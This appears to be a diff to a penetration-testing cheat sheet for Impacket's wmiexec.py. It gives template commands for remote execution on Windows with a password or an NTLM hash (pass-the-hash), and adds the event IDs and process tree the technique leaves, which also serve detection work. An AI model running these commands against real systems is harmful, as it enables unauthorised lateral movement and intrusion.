@@ -2,5 +2,18 @@
 python wmiexec.py <domain>/<user>:<password>@<rhost> <command>
 
 # use hashes and launch semi interactive shell
-python wmiexec.py -hashes <lm:ntlmHash> <domain>/<user>@<rhost> 
+python wmiexec.py -hashes :<:ntlmHash> <domain>/<user>@<rhost> 
+
+# opsec considerations
+Windows Security Log Event IDs
+-Logon (4624) -> multiple
+-Special Logon (4672) -> multiple
+
+Running Processes
+wininit.exe
+└── services.exe
+    └── svchost.exe
+        └── wmiprvse.exe
+            └── cmd.exe
+                └── Conhost.exe
 
